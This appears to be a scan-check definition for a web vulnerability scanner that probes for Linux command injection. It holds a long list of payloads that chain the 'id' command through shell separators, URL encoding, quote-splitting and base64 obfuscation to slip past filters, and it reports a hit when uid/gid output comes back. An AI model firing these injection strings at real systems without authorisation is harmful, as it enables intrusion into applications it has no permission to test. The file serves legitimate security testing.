metadata:
	language: v1-beta
	name: "RCE - Linux"
	description: "Remote Code Execution - Linux"
	author: "nu11secur1ty"
	tags: "rce", "linux"

run for each:
	payloads =
		`id`,
		`;id`,
		`%3bid`,
		`\nid`,
		`%0aid`,
		`&id`,
		`%26id`,
		`FAIL|id`,
		`FAIL%7cid`,
		`&&id`,
		`%26%26id`,
		`FAIL||id`,
		`FAIL%7c%7cid`,
		"`id`",
		";`id`",
		"%3b`id`",
		"\n`id`",
		"%0a`id`",
		"&`id`",
		"%26`id`",
		"FAIL|`id`",
		"FAIL%7c`id`",
		"&&`id`",
		"%26%26`id`",
		"FAIL||`id`",
		"FAIL%7c%7c`id`",
		`%60id%60`,
		`;%60id%60`,
		`%3b%60id%60`,
		`\n%60id%60`,
		`%0a%60id%60`,
		`&%60id%60`,
		`%26%60id%60`,
		`FAIL|%60id%60`,
		`FAIL%7c%60id%60`,
		`&&%60id%60`,
		`%26%26%60id%60`,
		`FAIL||%60id%60`,
		`FAIL%7c%7c%60id%60`,
		`i$()d`,
		`;i$()d`,
		`%3bi$()d`,
		`\ni$()d`,
		`%0ai$()d`,
		`&i$()d`,
		`%26i$()d`,
		`FAIL|i$()d`,
		`FAIL%7ci$()d`,
		`&&i$()d`,
		`%26%26i$()d`,
		`FAIL||i$()d`,
		`FAIL%7c%7ci$()d`,
		`i'd'`,
		`;i'd'`,
		`%3bi'd'`,
		`\ni'd'`,
		`%0ai'd'`,
		`&i'd'`,
		`%26i'd'`,
		`FAIL|i'd'`,
		`FAIL%7ci'd'`,
		`&&i'd'`,
		`%26%26i'd'`,
		`FAIL||i'd'`,
		`FAIL%7c%7ci'd'`,
		`i"d"`,
		`;i"d"`,
		`%3bi"d"`,
		`\ni"d"`,
		`%0ai"d"`,
		`&i"d"`,
		`%26i"d"`,
		`FAIL|i"d"`,
		`FAIL%7ci"d"`,
		`&&i"d"`,
		`%26%26i"d"`,
		`FAIL||i"d"`,
		`FAIL%7c%7ci"d"`,
		`i$@d`,
		`;i$@d`,
		`%3bi$@d`,
		`\ni$@d`,
		`%0ai$@d`,
		`&i$@d`,
		`%26i$@d`,
		`FAIL|i$@d`,
		`FAIL%7ci$@d`,
		`&&i$@d`,
		`%26%26i$@d`,
		`FAIL||i$@d`,
		`FAIL%7c%7ci$@d`,
		`i\d`,
		`;i\d`,
		`%3bi\d`,
		`\ni\d`,
		`%0ai\d`,
		`&i\d`,
		`%26i\d`,
		`FAIL|i\d`,
		`FAIL%7ci\d`,
		`&&i\d`,
		`%26%26i\d`,
		`FAIL||i\d`,
		`FAIL%7c%7ci\d`,
		"`echo 'aWQ='|base64 -d`",
		";`echo 'aWQ='|base64 -d`",
		"%3b`echo 'aWQ='|base64 -d`",
		"\n`echo 'aWQ='|base64 -d`",
		"%0a`echo 'aWQ='|base64 -d`",
		"&`echo 'aWQ='|base64 -d`",
		"%26`echo 'aWQ='|base64 -d`",
		"FAIL|`echo 'aWQ='|base64 -d`",
		"FAIL%7c`echo 'aWQ='|base64 -d`",
		"&&`echo 'aWQ='|base64 -d`",
		"%26%26`echo 'aWQ='|base64 -d`",
		"FAIL||`echo 'aWQ='|base64 -d`",
		"FAIL%7c%7c`echo 'aWQ='|base64 -d`",
		"`echo+'aWQ%3d'|base64+-d`",
		";`echo+'aWQ%3d'|base64+-d`",
		"%3b`echo+'aWQ%3d'|base64+-d`",
		"\n`echo+'aWQ%3d'|base64+-d`",
		"%0a`echo+'aWQ%3d'|base64+-d`",
		"&`echo+'aWQ%3d'|base64+-d`",
		"%26`echo+'aWQ%3d'|base64+-d`",
		"FAIL|`echo+'aWQ%3d'|base64+-d`",
		"FAIL%7c`echo+'aWQ%3d'|base64+-d`",
		"&&`echo+'aWQ%3d'|base64+-d`",
		"%26%26`echo+'aWQ%3d'|base64+-d`",
		"FAIL||`echo+'aWQ%3d'|base64+-d`",
		"FAIL%7c%7c`echo+'aWQ%3d'|base64+-d`",
		"`echo 'aWQ='|openssl base64 -d`",
		";`echo 'aWQ='|openssl base64 -d`",
		"%3b`echo 'aWQ='|openssl base64 -d`",
		"\n`echo 'aWQ='|openssl base64 -d`",
		"%0a`echo 'aWQ='|openssl base64 -d`",
		"&`echo 'aWQ='|openssl base64 -d`",
		"%26`echo 'aWQ='|openssl base64 -d`",
		"FAIL|`echo 'aWQ='|openssl base64 -d`",
		"FAIL%7c`echo 'aWQ='|openssl base64 -d`",
		"&&`echo 'aWQ='|openssl base64 -d`",
		"%26%26`echo 'aWQ='|openssl base64 -d`",
		"FAIL||`echo 'aWQ='|openssl base64 -d`",
		"FAIL%7c%7c`echo 'aWQ='|openssl base64 -d`",
		"`echo+'aWQ%3d'|openssl+base64+-d`",
		";`echo+'aWQ%3d'|openssl+base64+-d`",
		"%3b`echo+'aWQ%3d'|openssl+base64+-d`",
		"\n`echo+'aWQ%3d'|openssl+base64+-d`",
		"%0a`echo+'aWQ%3d'|openssl+base64+-d`",
		"&`echo+'aWQ%3d'|openssl+base64+-d`",
		"%26`echo+'aWQ%3d'|openssl+base64+-d`",
		"FAIL|`echo+'aWQ%3d'|openssl+base64+-d`",
		"FAIL%7c`echo+'aWQ%3d'|openssl+base64+-d`",
		"&&`echo+'aWQ%3d'|openssl+base64+-d`",
		"%26%26`echo+'aWQ%3d'|openssl+base64+-d`",
		"FAIL||`echo+'aWQ%3d'|openssl+base64+-d`",
		"FAIL%7c%7c`echo+'aWQ%3d'|openssl+base64+-d`"

given any insertion point then
    send payload:
        appending: {payloads}
    send payload:
        replacing: {payloads}

    if {latest.response} matches "(uid|gid|groups)=[0-9]+\(.+?\)" then
		report issue:
		    severity: high
		    confidence: tentative
		    detail: "Remote Code Execution - Linux"
    end if
